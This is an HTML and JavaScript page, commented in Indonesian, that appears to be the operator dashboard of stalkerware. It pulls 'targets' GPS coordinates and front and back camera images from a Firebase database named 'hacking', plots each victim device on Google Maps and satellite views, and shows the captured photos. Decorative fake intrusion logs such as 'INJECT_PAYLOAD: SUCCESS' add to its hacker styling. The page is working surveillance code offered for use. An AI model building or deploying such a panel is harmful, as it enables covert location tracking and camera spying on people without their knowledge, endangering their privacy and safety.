<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER_COMMAND // TRACKING SYSTEM</title>
    <style>
        body {
            background-color: #05070c;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 8px;
            box-sizing: border-box;
            font-size: 11px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px dashed #00ff66;
            padding-bottom: 5px;
            margin-bottom: 8px;
        }
        .selector-box select {
            background: #000;
            color: #00ff66;
            border: 1px solid #00ff66;
            padding: 3px;
            font-family: 'Courier New', Courier, monospace;
        }
        /* Perbaikan Tampilan Jam agar tidak mepet */
        .clock-box {
            text-align: right;
            font-size: 11px;
            line-height: 1.4;
            background: #000;
            border: 1px solid #00ff66;
            padding: 2px 6px;
        }
        .main-layout {
            display: grid;
            grid-template-columns: 1.2fr 1fr;
            gap: 8px;
            align-items: stretch;
        }
        .left-panel {
            display: flex;
            flex-direction: column;
        }
        .right-panel {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .box-container {
            border: 1px solid #00ff66;
            background: #0b0f19;
            padding: 5px;
            position: relative;
            display: flex;
            flex-direction: column;
        }
        .box-container.full-height {
            flex-grow: 1;
        }
        .box-title {
            font-size: 10px;
            color: #aaa;
            margin-bottom: 4px;
            text-transform: uppercase;
        }
        #mainMap {
            width: 100%;
            flex-grow: 1;
            min-height: 380px;
            border: none;
            background: #000;
        }
        iframe {
            width: 100%;
            border: none;
            background: #000;
        }
        .camera-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 6px;
        }
        .cam-box img {
            width: 100%;
            height: 110px;
            object-fit: cover;
            border: 1px solid #00ff66;
            background: #000;
        }
        .matrix-box {
            height: 85px;
            overflow-y: auto;
            background: #020408;
            border: 1px solid #00ff66;
            padding: 4px;
            font-size: 10px;
            color: #00ff66;
        }
        .terminal-container {
            border: 1px solid #00ff66;
            background: #020408;
            padding: 5px;
            margin-top: 8px;
            height: 60px;
            overflow-y: auto;
            font-size: 10px;
        }
        .btn-maps {
            display: inline-block;
            background: #00ff66;
            color: #000;
            text-decoration: none;
            padding: 3px 6px;
            font-weight: bold;
            font-size: 10px;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>

    <!-- Header Status -->
    <div class="header">
        <div>[ COMMAND_CENTER : TRACKING SYSTEM ] &nbsp; <span style="color:#00ff66;">STATUS: TARGET_LOCKED [LIVE]</span></div>
        <div class="selector-box">
            Target: 
            <select id="targetSelect" onchange="switchTarget()">
                <option value="">-- Pilih Perangkat --</option>
            </select>
        </div>
        <div class="clock-box" id="clockDisplay">00:00:00<br>0/0/0000</div>
    </div>

    <!-- Main Layout -->
    <div class="main-layout">
        
        <!-- Kolom Kiri: Peta Utama -->
        <div class="left-panel">
            <div class="box-container full-height">
                <a id="gmapsLink" href="#" target="_blank" class="btn-maps">Buka di Maps ↗</a>
                <iframe id="mainMap" src="about:blank"></iframe>
            </div>
        </div>

        <!-- Kolom Kanan: Peta Satelit Mini & Matrix Stream -->
        <div class="right-panel">
            <div class="box-container">
                <div class="box-title">SATELLITE_FEED</div>
                <iframe id="satMap" src="about:blank" style="height: 110px;"></iframe>
            </div>

            <div class="box-container">
                <div class="box-title">LIVE_CAMERA_FEED (FRONT & BACK)</div>
                <div class="camera-container">
                    <div class="cam-box">
                        <img id="imgFront" src="https://via.placeholder.com/320x240?text=No+Signal" alt="Kamera Depan">
                        <div style="text-align:center; font-size:9px; margin-top:2px;">Kamera Depan</div>
                    </div>
                    <div class="cam-box">
                        <img id="imgBack" src="https://via.placeholder.com/320x240?text=No+Signal" alt="Kamera Belakang">
                        <div style="text-align:center; font-size:9px; margin-top:2px;">Kamera Belakang</div>
                    </div>
                </div>
            </div>

            <div class="box-container">
                <div class="box-title">MATRIX_STREAM</div>
                <div class="matrix-box" id="matrixStream">
                    > [SYSTEM] Matrix stream initialized...<br>
                </div>
            </div>

        </div>
    </div>

    <!-- Terminal Log di Bawah -->
    <div class="terminal-container" id="terminalLog">
        > [SYSTEM] Initializing multi-target monitor interface...<br>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        let allTargetsData = {};
        let selectedTargetId = localStorage.getItem("selected_target_id") || "";
        let targetImages = {};

        const targetSelect = document.getElementById('targetSelect');
        const mainMap = document.getElementById('mainMap');
        const satMap = document.getElementById('satMap');
        const gmapsLink = document.getElementById('gmapsLink');
        const imgFront = document.getElementById('imgFront');
        const imgBack = document.getElementById('imgBack');
        const terminalLog = document.getElementById('terminalLog');
        const matrixStream = document.getElementById('matrixStream');

        function logTerminal(text) {
            terminalLog.innerHTML += `> ${text}<br>`;
            terminalLog.scrollTop = terminalLog.scrollHeight;
        }

        // Jam Real-time dengan format rapi (tidak mepet)
        setInterval(() => {
            const now = new Date();
            const timeStr = now.toTimeString().split(' ')[0];
            const dateStr = now.toLocaleDateString();
            document.getElementById('clockDisplay').innerHTML = `${timeStr}<br>${dateStr}`;
        }, 1000);

        // Efek Matrix Stream berjalan otomatis terus-menerus
        const matrixLogs = [
            "SYS_ALLOC: 0x1F8F5F8F8",
            "CONNECT: TCP_INTRUSION",
            "BYPASS.AUTH: OK",
            "INJECT_PAYLOAD: SUCCESS",
            "PACKET_SYNC: SECURE",
            "LISTENING_PORT: 443 [ACTIVE]",
            "GPS_POLL: RELAY_OK"
        ];
        
        setInterval(() => {
            const randomLog = matrixLogs[Math.floor(Math.random() * matrixLogs.length)];
            const timeNow = new Date().toTimeString().split(' ')[0];
            matrixStream.innerHTML += `> [${timeNow}] ${randomLog}<br>`;
            matrixStream.scrollTop = matrixStream.scrollHeight;
        }, 2500);

        // 1. Ambil Log Kamera Masuk
        db.ref("camera_logs").limitToLast(30).on("child_added", (snapshot) => {
            const data = snapshot.val();
            if (data && data.targetId) {
                if (!targetImages[data.targetId]) {
                    targetImages[data.targetId] = { Depan: null, Belakang: null };
                }
                targetImages[data.targetId][data.cameraType] = data.image;

                matrixStream.innerHTML += `> [${new Date().toTimeString().split(' ')[0]}] CAM_SYNC: ${data.cameraType} RECEIVED<br>`;
                matrixStream.scrollTop = matrixStream.scrollHeight;

                if (data.targetId === selectedTargetId) {
                    updateCameraUI(selectedTargetId);
                }
            }
        });

        // 2. Pantau Perubahan Data GPS Semua Target
        db.ref("targets").on("value", (snapshot) => {
            const targets = snapshot.val();
            if (!targets) {
                targetSelect.innerHTML = '<option value="">-- Tidak ada perangkat --</option>';
                return;
            }

            allTargetsData = targets;
            const targetIds = Object.keys(targets);

            let optionsHTML = '<option value="">-- Pilih Perangkat --</option>';
            targetIds.forEach(id => {
                const tName = targets[id].device || id;
                const isSelected = (id === selectedTargetId) ? 'selected' : '';
                optionsHTML += `<option value="${id}" ${isSelected}>${tName} (${id})</option>`;
            });
            targetSelect.innerHTML = optionsHTML;

            if (!selectedTargetId || !targets[selectedTargetId]) {
                selectedTargetId = targetIds[0];
                targetSelect.value = selectedTargetId;
                localStorage.setItem("selected_target_id", selectedTargetId);
            }

            renderSelectedTargetData();
        });

        function switchTarget() {
            selectedTargetId = targetSelect.value;
            localStorage.setItem("selected_target_id", selectedTargetId);
            renderSelectedTargetData();
            logTerminal(`[SYSTEM] Switched view to target: ${selectedTargetId}`);
        }

        function renderSelectedTargetData() {
            if (!selectedTargetId || !allTargetsData[selectedTargetId]) return;

            const data = allTargetsData[selectedTargetId];
            const lat = data.latitude;
            const lon = data.longitude;

            mainMap.src = `https://maps.google.com/maps?q=${lat},${lon}&z=16&output=embed`;
            satMap.src = `https://maps.google.com/maps?q=${lat},${lon}&z=18&t=k&output=embed`;
            gmapsLink.href = `https://www.google.com/maps?q=${lat},${lon}`;

            updateCameraUI(selectedTargetId);
        }

        function updateCameraUI(tId) {
            const imgs = targetImages[tId];
            if (imgs) {
                if (imgs.Depan) imgFront.src = imgs.Depan;
                if (imgs.Belakang) imgBack.src = imgs.Belakang;
            } else {
                imgFront.src = "https://via.placeholder.com/320x240?text=Waiting+Feed...";
                imgBack.src = "https://via.placeholder.com/320x240?text=Waiting+Feed...";
            }
        }
    </script>
</body>
</html>
